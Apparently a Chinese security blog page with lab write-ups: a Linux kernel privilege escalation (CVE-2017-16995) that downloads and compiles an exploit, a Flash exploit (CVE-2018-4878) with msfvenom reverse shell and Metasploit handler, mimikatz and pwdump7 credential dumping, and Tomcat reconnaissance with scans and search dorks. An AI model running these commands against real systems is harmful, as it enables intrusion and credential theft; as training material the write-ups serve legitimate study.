<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>shackle</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  
  
  
  <meta property="og:type" content="website">
<meta property="og:title" content="shackle">
<meta property="og:url" content="https://shackles.top/page/2/index.html">
<meta property="og:site_name" content="shackle">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="shackle">
  
    <link rel="alternate" href="/atom.xml" title="shackle" type="application/atom+xml">
  

  

  <link rel="icon" href="/css/images/mylogo1.jpg">
  <link rel="apple-touch-icon" href="/css/images/mylogo1.jpg">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
/*    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}*/


  </style>
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>
  <script src="/js/bootstrap.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >

  
    <link rel="stylesheet" href="/css/home.css" >
  

  

  

  
  
  

</head>



  <body>


  
    <header id="header">

	<!-- 背景图模式 -->
	

    
      <div id="intrologo" class="intro-logo" style="background-position:center; background-repeat:no-repeat; background-image: url(); background-size: auto 100%;">

      <!-- Support rolling -->  
        
        <section class="awSlider">
          <div class="carousel slide carousel-fade " data-ride="carousel">

            <!-- Wrapper for slides -->
            <div class="carousel-inner">
               
                  
                    <div class="item active">
                  
                    <img id="carousel-img0" src="http://pn5jn1i1e.bkt.clouddn.com/wqfe.jpg">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img0 = new Image();
                      var imageTag0 = document.getElementById("carousel-img0");
                      img0.src = imageTag0.src;
                      img0.onload=function(){
                        if (img0.width / img0.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag0.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag0.style.height = document.body.clientHeight + "px";
                          imageTag0.style.marginLeft = -(document.body.clientHeight * img0.width / img0.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
                  
                    <div class="item">
                  
                    <img id="carousel-img1" src="https://source.unsplash.com/1920x1080/?nature">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img1 = new Image();
                      var imageTag1 = document.getElementById("carousel-img1");
                      img1.src = imageTag1.src;
                      img1.onload=function(){
                        if (img1.width / img1.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag1.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag1.style.height = document.body.clientHeight + "px";
                          imageTag1.style.marginLeft = -(document.body.clientHeight * img1.width / img1.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
                  
                    <div class="item">
                  
                    <img id="carousel-img2" src="https://source.unsplash.com/collection/954550/1920x1080">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img2 = new Image();
                      var imageTag2 = document.getElementById("carousel-img2");
                      img2.src = imageTag2.src;
                      img2.onload=function(){
                        if (img2.width / img2.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag2.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag2.style.height = document.body.clientHeight + "px";
                          imageTag2.style.marginLeft = -(document.body.clientHeight * img2.width / img2.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
            </div>

            <!-- Controls -->
            <a class="left carousel-control" href=".carousel" role="button" data-slide="prev">
              <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
              <span class="sr-only">Geri</span>
            </a>
            <a class="right carousel-control" href=".carousel" role="button" data-slide="next">
              <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
              <span class="sr-only">İleri</span>
            </a>
          </div>
        </section>
        <script>
          $('section.awSlider .carousel').carousel({
              pause: '',
              interval: 5000
          });
          var startImage = $('section.awSlider .item.active > img').attr('src');
          $('section.awSlider .carousel').on('slid.bs.carousel', function () {
              var bscn = $(this).find('.item.active > img').attr('src');
              $('section.awSlider > img').attr('src', bscn);
          });
        </script>
      

    
 


    <canvas width="100%" height="100%"></canvas>
    <script>
      var c = document.getElementsByTagName('canvas')[0],
          x = c.getContext('2d'),
          w = window.innerWidth,
          h = window.innerHeight,
          pr = window.devicePixelRatio || 1,
          f = 90,
          q,
          m = Math,
          r = 0,
          u = m.PI*2,
          v = m.cos,
          z = m.random
      c.width = w*pr
      c.height = h*pr
      x.scale(pr, pr)
      x.globalAlpha = 0.6

      <!-- 折线Polyline背景 -->
      
    </script>
    

    
      <div id="homelogo" class="homelogo" style="background: rgba(255,255,255,1);"> 
    

        
          <div class="homelogoback"  style="border: 1px solid #404040;" >
            <h1><a href="#content" id="logo">shackle</a></h1>
            <h3></h3>
            <h5>shackle</h5>
            <!-- <p><a href="https://github.com/iTimeTraveler" target="_blank">Github</a></p> -->
          </div>
        
    
    </div>
  </div>

  <!-- 自适应主页背景大图 -->
  

 <!-- home_logo_image居中 -->
 
    <script>
        var homelogodiv = document.getElementById("homelogo");
        if (document.all.homelogo.offsetWidth > document.body.clientWidth) {
          homelogodiv.style.width = document.body.clientWidth + "px";
          homelogodiv.style.marginLeft = document.body.clientWidth * -0.5 + "px";
        } else {
          homelogodiv.style.width = homelogodiv.clientWidth  + "px";
          homelogodiv.style.marginLeft = (homelogodiv.clientWidth)  * -0.5 + "px";
        }
    </script>
  

  <div class="intro-navigate">
      <p class="navigater-list">
        
          <a id="beautifont" class="main-nav-link" href="/">首页</a>
        
          <a id="beautifont" class="main-nav-link" href="/archives">归档</a>
        
          <a id="beautifont" class="main-nav-link" href="/about">关于</a>
        
      </p>
  </div>

</header>
  
  <div id="container">
    <div id="wrap">
      
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;">
  
    <article id="post-CVE-2017-16995 Ubuntu16.04"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/03/17/CVE-2017-16995 Ubuntu16.04/">CVE-2017-16995 Ubuntu16.04漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/03/17/CVE-2017-16995 Ubuntu16.04/" class="article-date">
	  <time datetime="2018-03-17T15:53:56.000Z" itemprop="datePublished">2018-03-17</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CVE-2017-16995-Ubuntu16-04"><a href="#CVE-2017-16995-Ubuntu16-04" class="headerlink" title="CVE-2017-16995 Ubuntu16.04"></a>CVE-2017-16995 Ubuntu16.04</h1><p><strong>影响版本：</strong><br>Linux内核：Linux Kernel Version 4.14 ~ 4.4<br>Ubuntu版本：16.04.01~ 16.04.04</p>
<p>提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">使用cat /proc/version查看Linux内核版本 ：</span><br><span class="line">cat /etc/shadow查看账号密码</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">wget  http://cyseclabs.com/pub/upstream44.c</span><br><span class="line">gcc -o test upstream44.c </span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>emmmm  不懂</p>
<h2 id="修复和缓解建议："><a href="#修复和缓解建议：" class="headerlink" title="修复和缓解建议："></a>修复和缓解建议：</h2><p>目前暂未有明确的补丁升级方案。 建议用户在评估风险后，通过修改内核参数限制普通用户使用bpf(2)系统调用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo 1 &gt; /proc/sys/kernel/unprivileged_bpf_disabled</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-Adobe远程代码执行漏洞-CVE-2018-4878"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/03/06/Adobe远程代码执行漏洞-CVE-2018-4878/">Adobe远程代码执行漏洞-CVE-2018-4878</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/03/06/Adobe远程代码执行漏洞-CVE-2018-4878/" class="article-date">
	  <time datetime="2018-03-06T04:52:08.000Z" itemprop="datePublished">2018-03-06</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Adobe远程代码执行漏洞-CVE-2018-4878"><a href="#Adobe远程代码执行漏洞-CVE-2018-4878" class="headerlink" title="Adobe远程代码执行漏洞-CVE-2018-4878"></a>Adobe远程代码执行漏洞-CVE-2018-4878</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&emsp;&emsp;2018年2月1日， Adobe官方发布了Adobe Flash Player系列产品的安全通告（APSA18-01），一个最新的Adobe Flash零日漏洞被发现针对韩国地区的人员发起攻击，该0day漏洞编号为CVE-2018-4878，目前最新版本28.0.0.137及其以前版本的Adobe Flash Player均受漏洞影响，Adobe官方将于2月5日发布漏洞补丁。CVE-2018-4878的被用于针对Windows用户的有限的针对性攻击。这些攻击利用通过电子邮件分发嵌入式恶意Flash内容的Office文档。    </p>
<p>&emsp;&emsp;如下图所示影响 Flash Player28.0.0.137以及之前的所有版本 </p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/gmdcKDH43c.png?imageslim" alt="mark"></p>
<p><a href="https://helpx.adobe.com/security/products/flash-player/apsa18-01.html" target="_blank" rel="noopener">https://helpx.adobe.com/security/products/flash-player/apsa18-01.html</a></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一步-生成payload"><a href="#第一步-生成payload" class="headerlink" title="第一步 生成payload"></a>第一步 生成payload</h3><p>进入CVE-2018-4878-payload目录中</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/IjKa0j63b4.png?imageslim" alt="mark"></p>
<p>用msfvenom生成python语言的shellcode。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.11 lport=8118  -f  python&gt;shellcode.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shellcode.txt</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/Fb2KLdG5E9.png?imageslim" alt="mark"></p>
<p>生成目录如下图所示（如需更改vim编辑）：</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/3i5J1f12a2.png?imageslim" alt="mark"></p>
<p>把使用实验环境所给的tmp.py文件追加到已经把shellcode.txt改名为payload.py文件中。得到最终的payload.py才是我们的攻击完整的程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp shellcode.txt payload.py</span><br><span class="line">cat tmp.py &gt;&gt;payload.py</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/gdL4GdLd91.png?imageslim" alt="mark"></p>
<p>payload.py 文件部分如下，可以根据情况更改：</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/eii5iA38Lf.png?imageslim" alt="mark"></p>
<p>执行我们的攻击程序payload.py。生成exploit.swf与index.html文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python payload.py</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/b3E49AAmIC.png?imageslim" alt="mark"></p>
<p>接下来开启apache服务也就是我们的Web服务诱导目标用户访问。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service apache2 start</span><br></pre></td></tr></table></figure>
<p>sudo  需要输入密码 为360College</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/Jbc72gJC5f.png?imageslim" alt="mark"></p>
<p>可以看到Apache服务开启。我们再吧index.html与exploit.swf文件复制到/var/www/html目录下也就是Apache服务器的web访问目录，使用户可以访问我们的这些文件，从而漏洞利用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp index.html /var/www/html/index2.html </span><br><span class="line">sudo cp exploit.swf /var/www/html/exploit.swf</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/B6a878HdA2.png?imageslim" alt="mark"></p>
<h3 id="第二步-Metasploit-利用"><a href="#第二步-Metasploit-利用" class="headerlink" title="第二步 Metasploit 利用"></a>第二步 Metasploit 利用</h3><p>启动Metasploit，执行以下命令，监听端口，等待目标上钩，反弹shell到kali攻击机。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.0.11 [攻击机IP地址]</span><br><span class="line">set lport 8118</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/G3lj8ieiIm.png?imageslim" alt="mark"></p>
<h3 id="第三步-靶机上钩"><a href="#第三步-靶机上钩" class="headerlink" title="第三步 靶机上钩"></a>第三步 靶机上钩</h3><p>在靶机上，安装Adobe Flash Player软件。点击安装，下一步即可安装。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/Gb7laaD5D9.png?imageslim" alt="mark"></p>
<p>安装成功。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/358k6HgECj.png?imageslim" alt="mark"></p>
<p>打开IE浏览器。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/6LB724akc2.png?imageslim" alt="mark"></p>
<p>在IE浏览器上输入。kali攻击机IP地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.11   [kali攻击机IP地址]</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/1Dijdmkmdb.png?imageslim" alt="mark"></p>
<h3 id="第三步-后渗透阶段"><a href="#第三步-后渗透阶段" class="headerlink" title="第三步 后渗透阶段"></a>第三步 后渗透阶段</h3><p>靶机在输入kali攻击机IP地址后，在kali攻击机中的msf可以看到。成功反弹靶机shell。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/eb1eAiIf0i.png?imageslim" alt="mark"></p>
<p>得到meterpreter，输入sysinfo看到靶机的系统信息。可进一步的渗透。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180728/Ekk6ElEma1.png?imageslim" alt="mark"></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-口令暴破解实验"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/02/16/口令暴破解实验/">口令暴力破解实验</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/02/16/口令暴破解实验/" class="article-date">
	  <time datetime="2018-02-16T09:52:08.000Z" itemprop="datePublished">2018-02-16</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>#口令暴力破解实验  </p>
<h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>&emsp;&emsp;     早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了WindowsNT挑战/响应验证机制，称之为<strong>NTLM</strong>。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为<strong>hash</strong>（中文：哈希），Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。在Windows中使用安全帐户管理器 (SAM) 数据库中或 Active Directory 数据库中存储用户记录。每个密码被加密并存储在 SAM 数据库中或在 Active Directory 数据库。 </p>
<p><strong>Windows系统下的hash密码格式为：用户名称:RID:LM-HASH值:NT-HASH值</strong></p>
<p>例如：  用户名称为：Administrator</p>
<p>Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC:::</p>
<p>​    表示R为：</p>
<p>​    ID为：500</p>
<p>​    LM-HASH值为：C8825DB10F2590EAAAD3B435B51404EE<br>​    NT-HASH值为：683020925C5D8569C23AA724774CE6CC </p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="1、使用-mimikatz-获取明文密码"><a href="#1、使用-mimikatz-获取明文密码" class="headerlink" title="1、使用 mimikatz 获取明文密码"></a>1、使用 mimikatz 获取明文密码</h3><p>​    mimikatz是一款功能强大的轻量级调试神器，提升进程权限注入进程读取进程内存，使用 mimikatz 获取明文密码。</p>
<p>首先用管理员身份打开命令终端窗口cmd。</p>
<p>&emsp;&emsp;使用 mimikatz 获取明文密码，用管理员身份打开命令终端窗口cmd。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/98dcfjKm8h.png?imageslim" alt="mark"></p>
<p>点击确定</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/AhE26DIjKL.png?imageslim" alt="mark"></p>
<p>复制目录文件，到桌面下mimikatz_trunk目录下的Win32目录下并执行mimikatz命令。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/gH1A7ge6mm.png?imageslim" alt="mark"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Users\college\Desktop\mimikatz_trunk\Win32</span><br><span class="line">mimikatz</span><br></pre></td></tr></table></figure>
<p>执行mimikatz命令后可看到进入mimikatz软件交互界面。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/89JG2djG92.png?imageslim" alt="mark"></p>
<p>进入mimikatz软件交互界面后执行以下命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/DHc1fJI62K.png?imageslim" alt="mark"></p>
<p>如图所示得到明文密码，另SHA1密码可在线破解</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/gb1Ba8L4J4.png?imageslim" alt="mark"></p>
<h3 id="2、使用-pwdump7-获取密码NTLM-hash"><a href="#2、使用-pwdump7-获取密码NTLM-hash" class="headerlink" title="2、使用 pwdump7 获取密码NTLM hash"></a>2、使用 pwdump7 获取密码NTLM hash</h3><p>NTLM hash是指Windows系统下Security Account Manager中保存的用户密码hash</p>
<p>该NTLM hash的生成方法：</p>
<ol>
<li><p>将明文口令转换成十六进制的格式</p>
</li>
<li><p>转换成Unicode格式，即在每个字节之后添加0x00</p>
</li>
<li><p>对Unicode字符串作MD4加密，生成32位的十六进制数字串</p>
</li>
</ol>
<p>同上一个实验，进入管理员cmd，进入pwdump7 目录，执行以下命令，可得到本地NTLM hash。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cd C:\Users\college\Desktop\pwdump7</span><br><span class="line"></span><br><span class="line">pwdump7</span><br></pre></td></tr></table></figure></p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/8bH8Ca0h0d.png?imageslim" alt="mark"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">college:1000:NO PASSWORD*********************:7C70A81C7C5882C24298D391FD397885:::</span><br><span class="line">user:1001:NO PASSWORD*********************:57D583AA46D571502AAD4BB7AEA09C70:::</span><br></pre></td></tr></table></figure>
<p>可在线破解NTLM 密码</p>
<p><a href="http://www.cmd5.com/" target="_blank" rel="noopener">http://www.cmd5.com/</a></p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180726/76C0ak8f29.png?imageslim" alt="mark"></p>
<h2 id="思考与总结"><a href="#思考与总结" class="headerlink" title="思考与总结"></a>思考与总结</h2><p>&emsp;&emsp;通过本次实验，成功实现了Windows 下密码的抓取与剖解，了解windows系统密码Hash 相关知识。</p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/口令/">口令</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-中间件安全-Tomcat 系列漏洞利用与安全加固"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/02/03/中间件安全-Tomcat 系列漏洞利用与安全加固/">Tomcat 系列漏洞利用与安全加固</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/02/03/中间件安全-Tomcat 系列漏洞利用与安全加固/" class="article-date">
	  <time datetime="2018-02-03T15:53:56.000Z" itemprop="datePublished">2018-02-03</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Tomcat-系列漏洞利用与安全加固"><a href="#Tomcat-系列漏洞利用与安全加固" class="headerlink" title="Tomcat 系列漏洞利用与安全加固"></a>Tomcat 系列漏洞利用与安全加固</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>​    Tomcat 是由 Apache 开发的一个 Servlet 容器，实现了对 Servlet 和 JSP 的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。</p>
<p>​    由于 Tomcat 本身也内含了一个 HTTP 服务器，它也可以被视作一个单独的 Web 服务器。但是，不能将 Tomcat 和 Apache HTTP 服务器混淆，Apache HTTP 服务器是一个用 C 语言实现的 HTTP Web 服务器；这两个 HTTP web server 不是捆绑在一起的。Tomcat 包含了一个配置管理工具，也可以通过编辑XML格式的配置文件来进行配置。</p>
<h3 id="Tomcat-重要目录"><a href="#Tomcat-重要目录" class="headerlink" title="Tomcat 重要目录"></a>Tomcat 重要目录</h3><ul>
<li><strong>/bin</strong> - Tomcat 脚本存放目录（如启动、关闭脚本）。 <code>*.sh</code> 文件用于 Unix 系统； <code>*.bat</code> 文件用于 Windows 系统。</li>
<li><strong>/conf</strong> - Tomcat 配置文件目录。</li>
<li><strong>/logs</strong> - Tomcat 默认日志目录。</li>
<li><strong>/webapps</strong> - webapp 运行的目录。</li>
</ul>
<h3 id="web-工程发布目录结构"><a href="#web-工程发布目录结构" class="headerlink" title="web 工程发布目录结构"></a>web 工程发布目录结构</h3><p>一般 web 项目路径结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">|-- webapp                         # 站点根目录</span><br><span class="line">    |-- META-INF                   # META-INF 目录</span><br><span class="line">    |   `-- MANIFEST.MF            # 配置清单文件</span><br><span class="line">    |-- WEB-INF                    # WEB-INF 目录</span><br><span class="line">    |   |-- classes                # class文件目录</span><br><span class="line">    |   |   |-- *.class            # 程序需要的 class 文件</span><br><span class="line">    |   |   `-- *.xml              # 程序需要的 xml 文件</span><br><span class="line">    |   |-- lib                    # 库文件夹</span><br><span class="line">    |   |   `-- *.jar              # 程序需要的 jar 包</span><br><span class="line">    |   `-- web.xml                # Web应用程序的部署描述文件</span><br><span class="line">    |-- &lt;userdir&gt;                  # 自定义的目录</span><br><span class="line">    |-- &lt;userfiles&gt;                # 自定义的资源文件</span><br></pre></td></tr></table></figure>
<p><code>webapp</code>：工程发布文件夹。其实每个 war 包都可以视为 webapp 的压缩包。</p>
<p><code>META-INF</code>：META-INF 目录用于存放工程自身相关的一些信息，元文件信息，通常由开发工具，环境自动生成。</p>
<p><code>WEB-INF</code>：Java web应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。</p>
<p><code>/WEB-INF/classes</code>：存放程序所需要的所有 Java class 文件。</p>
<p><code>/WEB-INF/lib</code>：存放程序所需要的所有 jar 文件。</p>
<p><code>/WEB-INF/web.xml</code>：web 应用的部署配置文件。它是工程中最重要的配置文件，它描述了 servlet 和组成应用的其它组件，以及应用初始化参数、安全管理约束等。</p>
<h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><h3 id="1-发现目标的-tomcat-管理控制台入口"><a href="#1-发现目标的-tomcat-管理控制台入口" class="headerlink" title="1.    发现目标的 tomcat 管理控制台入口"></a>1.    发现目标的 tomcat 管理控制台入口</h3><p>第一种,通过常规端口扫描,获取服务 banner    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -n -sT -Pn --open -v -p 8080-8090,8443 -sV 192.168.3.100-200	tomcat 的默认端口通常情况下都会在这个区间内,至于具体用什么扫无所谓,masscan,zmap 都一样,只不过 nmap 会识别的更精准</span><br></pre></td></tr></table></figure>
<p>第二种,通过各类外部 web 搜索引擎进行批量抓取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Googele dorks:</span><br><span class="line">nurl:/manager/html intitle:apache tomcat site:*.target.*	通 常 ,Tomcat 控 制 台 的 默 认 路 径 都 为 /manager/html </span><br><span class="line">intext:$CATALINA_HOME/webapps/ROOT/ intitle:Apache Tomcat site:*.target.*	在低版本的 tomcat 欢迎页中还会写有 CATALINA 的路径,可把此作为关键字来精确搜索intext:$CATALINA_HOME/webapps/ROOT/ intitle:Apache Tomcat/6.0.24 site:*.target.*	可以只找特定版本的 tomcat,比如,爆出专门针对某个特定版本 tomcat 的漏洞</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bing dorks:</span><br><span class="line">intitle:&quot;apache tomcat&quot; site:target.com	搜集特定目标的所有 tomcat 入口,个人觉得 bing 有时候比 google 更精准</span><br></pre></td></tr></table></figure>
<p>第三种,通过各类空间搜索引擎进行批量抓取 [ 此处暂以 shodan 为例, zoomeye,fofa,censys…其实都差不多,不差钱的情况下,个人还是更建议直接用 shodan,毕竟它没有处理过搜索结果,脚本配合 api 批量抓会很方便 ]</p>
